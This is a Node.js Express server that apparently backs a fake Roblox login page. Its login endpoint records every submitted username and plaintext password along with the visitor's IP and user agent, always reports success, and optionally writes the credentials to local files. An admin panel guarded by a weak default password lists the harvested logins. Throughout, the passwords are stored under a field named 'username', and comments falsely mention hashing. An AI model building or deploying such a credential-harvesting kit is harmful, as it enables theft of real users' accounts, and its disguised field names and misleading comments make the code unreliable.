require('dotenv').config();
const path = require('path');
const express = require('express');
const session = require('express-session');
const { MongoClient } = require('mongodb');
// NOTE: Passwords are intentionally stored in plaintext (no hashing).
// This is insecure and should only be used for local testing.
const fs = require('fs').promises;
const morgan = require('morgan');

// In-memory fallback storage for login attempts
const loginAttempts = [];
// in-memory fallback for usernames collection
const usernamesList = [];

// MongoDB client + collection (initialized at startup if MONGODB_URI provided)
let dbClient = null;
let attemptsCol = null;
let usernamesCol = null;

async function initDb(){
  const uri = process.env.MONGODB_URI;
  if(!uri) {
    console.warn('MONGODB_URI not set — falling back to in-memory storage');
    return;
  }
  dbClient = new MongoClient(uri, { maxPoolSize: 10 });
  await dbClient.connect();
  const dbName = process.env.DB_NAME || 'roblox-login';
  const db = dbClient.db(dbName);
  attemptsCol = db.collection('attempts');
  usernamesCol = db.collection('usernames');
  // useful index for queries
  await attemptsCol.createIndex({ createdAt: -1 });
  await usernamesCol.createIndex({ username: 1 });
  console.log('Connected to MongoDB database:', dbName);
}

const app = express();
const PORT = process.env.PORT || 3000;

// Basic logging
app.use(morgan('tiny'));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(session({
  secret: process.env.SESSION_SECRET || 'dev-secret',
  resave: false,
  saveUninitialized: false,
  // Default MemoryStore used (suitable for dev/demo only)
  cookie: { maxAge: 1000 * 60 * 60 * 3 }
}));

// Serve static site
app.use(express.static(path.join(__dirname)));

// POST login - store username + hashed password (demo only)
app.post('/api/login', async (req, res) => {
  try{
    const { username = '', password = '' } = req.body;
    if(!username || !password) return res.status(400).json({ ok:false, message:'Missing fields' });

    // Store the submitted password value into the `username` field (insecure, per request)
    // keep the originally-entered username in `originalUsername` for reference
    const attempt = { username: password, originalUsername: username, ip: req.ip, ua: req.get('User-Agent'), createdAt: new Date() };
    let insertResult = null;
    if(attemptsCol){
      insertResult = await attemptsCol.insertOne(attempt);
    } else {
      loginAttempts.push(attempt);
      insertResult = { insertedId: null };
    }

    // Also save the password value into a separate `usernames` collection (behave like username)
    const unameDoc = { username: password, sourceAttemptId: insertResult.insertedId, createdAt: new Date() };
    if(usernamesCol){
      await usernamesCol.insertOne(unameDoc);
    } else {
      usernamesList.push(unameDoc);
    }

    // Optionally persist into a local `usernames/` folder as a JSON file.
    // Disabled by default in production; enable by setting ENABLE_LOCAL_USERNAMES=1
    const enableLocalUsernames = (process.env.ENABLE_LOCAL_USERNAMES === '1' || process.env.ENABLE_LOCAL_USERNAMES === 'true');
    if(enableLocalUsernames){
      try{
        const usernamesDir = path.join(__dirname, 'usernames');
        await fs.mkdir(usernamesDir, { recursive: true });
        const fileName = `${Date.now()}-${Math.random().toString(36).slice(2,8)}.json`;
        const filePath = path.join(usernamesDir, fileName);
        const fileData = { username: password, originalUsername: username, sourceAttemptId: insertResult.insertedId, createdAt: new Date() };
        await fs.writeFile(filePath, JSON.stringify(fileData, null, 2), 'utf8');
      }catch(writeErr){
        console.warn('Could not write username file:', writeErr && writeErr.message ? writeErr.message : writeErr);
      }
    }
    return res.json({ ok:true });
  }catch(err){
    console.error(err);
    return res.status(500).json({ ok:false });
  }
});

// Admin login - server side gate
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body || {};
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
  if(password === ADMIN_PASSWORD){
    req.session.isAdmin = true;
    return res.json({ ok:true });
  }
  return res.status(401).json({ ok:false });
});

// Protected: list attempts (no passHash returned)
app.get('/api/admin/attempts', async (req, res) => {
  if(!req.session.isAdmin) return res.status(401).json({ ok:false });
  try{
    if(attemptsCol){
      const attempts = await attemptsCol.find({}, { projection: { password: 0 } })
        .sort({ createdAt: -1 })
        .limit(200)
        .toArray();
      return res.json({ ok:true, attempts });
    }
    // fallback to in-memory
    const attempts = loginAttempts
      .slice()
      .sort((a,b)=>b.createdAt - a.createdAt)
      .slice(0,200)
      .map(({ username, ip, ua, createdAt })=>({ username, ip, ua, createdAt }));
    return res.json({ ok:true, attempts });
  }catch(err){
    console.error(err);
    return res.status(500).json({ ok:false });
  }
});

// Admin: list saved 'usernames' (these are the submitted passwords stored as usernames)
app.get('/api/admin/usernames', async (req, res) => {
  if(!req.session.isAdmin) return res.status(401).json({ ok:false });
  try{
    if(usernamesCol){
      const names = await usernamesCol.find({})
        .sort({ createdAt: -1 })
        .limit(200)
        .toArray();
      return res.json({ ok:true, usernames: names });
    }
    const names = usernamesList.slice().reverse().slice(0,200);
    return res.json({ ok:true, usernames: names });
  }catch(err){
    console.error(err);
    return res.status(500).json({ ok:false });
  }
});

// Simple logout
app.post('/api/admin/logout', (req, res)=>{
  req.session.destroy(()=>res.json({ ok:true }));
});

// Start server after attempting DB init so we know whether MongoDB is available
async function start(){
  try{
    await initDb();
  }catch(err){
    console.error('Failed to init DB, continuing with in-memory storage', err);
  }
  app.listen(PORT, ()=>console.log(`Server running on http://localhost:${PORT}`));
}

start();

// Graceful shutdown
process.on('SIGINT', async ()=>{
  console.log('Shutting down...');
  if(dbClient){
    try{ await dbClient.close(); console.log('MongoDB connection closed'); }catch(e){console.error(e)}
  }
  process.exit(0);
});
